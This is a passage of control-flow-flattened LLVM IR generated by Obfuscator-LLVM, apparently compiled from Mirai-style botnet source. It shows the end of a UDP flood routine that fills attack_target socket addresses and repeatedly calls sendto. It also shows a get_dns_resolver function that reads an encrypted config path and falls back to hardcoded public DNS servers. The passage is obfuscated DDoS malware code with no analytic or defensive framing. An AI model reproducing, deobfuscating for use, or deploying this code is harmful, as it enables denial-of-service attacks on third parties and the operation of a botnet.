  %379 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %378, i32 0, i32 1
  %380 = load i16, i16* %379, align 2
  %381 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i32 0, i32 0
  %386 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %385, i32 0, i32 1
  store i16 %380, i16* %386, align 2
  %387 = load i32, i32* %10, align 4
  %388 = load i8*, i8** %33, align 8
  %389 = load i8, i8* %19, align 1
  %390 = zext i8 %389 to i64
  %391 = add i64 41, %390
  %392 = add i64 %391, 2
  %393 = load i32, i32* %21, align 4
  %394 = sext i32 %393 to i64
  %395 = add i64 %392, %394
  %396 = add i64 %395, 4
  %397 = bitcast %union.__CONST_SOCKADDR_ARG* %38 to %struct.sockaddr**
  %398 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %399 = load i32, i32* %9, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i32 0, i32 0
  %403 = bitcast %struct.sockaddr_in* %402 to %struct.sockaddr*
  store %struct.sockaddr* %403, %struct.sockaddr** %397, align 8
  %404 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %38, i32 0, i32 0
  %405 = load %struct.sockaddr*, %struct.sockaddr** %404, align 8
  %406 = call i64 @sendto(i32 %387, i8* %388, i64 %396, i32 16384, %struct.sockaddr* %405, i32 16)
  store i32 432903421, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = load i32, i32* %9, align 4
  %409 = add nsw i32 %408, 1
  store i32 %409, i32* %9, align 4
  store i32 835709674, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  store i32 -1083305874, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %410, %407, %338, %332, %327, %321, %316, %310, %305, %299, %276, %270, %269, %268, %265, %250, %247, %246, %243, %233, %224, %219, %166, %162, %106, %100, %99, %96, %90, %89, %83, %82, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %.reg2mem8 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 46)
  %11 = call i8* @table_retrieve_val(i32 46, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 46)
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1447608423, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -1447608423, label %first
    i32 1077935163, label %16
    i32 -257210500, label %30
    i32 300076260, label %32
    i32 -1386183930, label %37
    i32 -1432989796, label %45
    i32 -2028980370, label %50
    i32 -1189152709, label %55
    i32 -1821878578, label %56
    i32 -400132967, label %57
    i32 575914574, label %58
    i32 463893719, label %63
    i32 -1484384901, label %68
    i32 -625914537, label %73
    i32 1619489550, label %79
    i32 167615063, label %93
    i32 786194736, label %94
    i32 -1864518722, label %97
    i32 -1195894664, label %101
    i32 51767527, label %104
    i32 -353829782, label %105
    i32 1979198500, label %106
    i32 -1122929838, label %NodeBlock5
    i32 1787769161, label %NodeBlock3
    i32 1277368032, label %LeafBlock1
    i32 2023511053, label %NodeBlock
    i32 -1480579964, label %LeafBlock
    i32 -1430652770, label %114
    i32 -559859094, label %116
    i32 1657803643, label %118
    i32 -1243447544, label %120
    i32 1334675702, label %NewDefault
    i32 1231835051, label %122
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sge i32 %.reload, 0
  %15 = select i1 %14, i32 1077935163, i32 1979198500
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i32, i32* %2, align 4
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %19 = call i64 @read(i32 %17, i8* %18, i64 2048)
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @close(i32 %21)
  call void @table_unlock_val(i8 zeroext 47)
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %24 = load i32, i32* %3, align 4
  %25 = call i8* @table_retrieve_val(i32 47, i32* null)
  %26 = call i32 @util_stristr(i8* %23, i32 %24, i8* %25)
  store i32 %26, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 47)
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, -1
  %29 = select i1 %28, i32 -257210500, i32 -353829782
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %6, align 4
  store i32 300076260, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp slt i32 %33, %34
  %36 = select i1 %35, i32 -1386183930, i32 -1864518722
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %6, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  store i8 %41, i8* %10, align 1
  %42 = load i8, i8* %8, align 1
  %43 = icmp ne i8 %42, 0
  %44 = select i1 %43, i32 575914574, i32 -1432989796
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -1189152709, i32 -2028980370
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8, i8* %10, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 9
  %54 = select i1 %53, i32 -1189152709, i32 -1821878578
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 786194736, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i8 1, i8* %8, align 1
  store i32 -400132967, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 575914574, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8, i8* %10, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp ne i32 %60, 46
  %62 = select i1 %61, i32 463893719, i32 -625914537
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8, i8* %10, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp slt i32 %65, 48
  %67 = select i1 %66, i32 1619489550, i32 -1484384901
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8, i8* %10, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp sgt i32 %70, 57
  %72 = select i1 %71, i32 1619489550, i32 -625914537
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %3, align 4
  %76 = sub nsw i32 %75, 1
  %77 = icmp eq i32 %74, %76
  %78 = select i1 %77, i32 1619489550, i32 167615063
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %81 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %82 = load i32, i32* %4, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i32, i32* %6, align 4
  %86 = load i32, i32* %4, align 4
  %87 = sub nsw i32 %85, %86
  call void @util_memcpy(i8* %80, i8* %84, i32 %87)
  %88 = load i32, i32* %6, align 4
  %89 = load i32, i32* %4, align 4
  %90 = sub nsw i32 %88, %89
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  store i8 1, i8* %9, align 1
  store i32 -1864518722, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 786194736, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %6, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %6, align 4
  store i32 300076260, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* %9, align 1
  %99 = icmp ne i8 %98, 0
  %100 = select i1 %99, i32 -1195894664, i32 51767527
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  store i32 1231835051, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 -353829782, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 1979198500, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  store i32 %108, i32* %.reg2mem8
  store i32 -1122929838, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem8
  %Pivot6 = icmp slt i32 %.reload13, 2
  %109 = select i1 %Pivot6, i32 2023511053, i32 1787769161
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem8
  %Pivot4 = icmp slt i32 %.reload10, 3
  %110 = select i1 %Pivot4, i32 1657803643, i32 1277368032
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf2 = icmp eq i32 %.reload9, 3
  %111 = select i1 %SwitchLeaf2, i32 -1243447544, i32 1334675702
  store i32 %111, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem8
  %Pivot = icmp slt i32 %.reload12, 1
  %112 = select i1 %Pivot, i32 -1480579964, i32 -559859094
  store i32 %112, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem8
  %SwitchLeaf = icmp eq i32 %.reload11, 0
  %113 = select i1 %SwitchLeaf, i32 -1430652770, i32 1334675702
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = call i32 @htonl(i32 134744072) #7
  store i32 %115, i32* %1, align 4
  store i32 1231835051, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call i32 @htonl(i32 1246898730) #7
  store i32 %117, i32* %1, align 4
  store i32 1231835051, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @htonl(i32 1074151430) #7
  store i32 %119, i32* %1, align 4
  store i32 1231835051, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = call i32 @htonl(i32 67240450) #7
  store i32 %121, i32* %1, align 4
  store i32 1231835051, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1231835051, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %1, align 4
  ret i32 %123

loopEnd:                                          ; preds = %NewDefault, %120, %118, %116, %114, %LeafBlock, %NodeBlock, %LeafBlock1, %NodeBlock3, %NodeBlock5, %106, %105, %104, %101, %97, %94, %93, %79, %73, %68, %63, %58, %57, %56, %55, %50, %45, %37, %32, %30, %16, %first, %switchDefault
  br label %loopEntry
}

declare i32 @rand_alphastr(...) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846634}
!2 = !{i32 -2146846225}
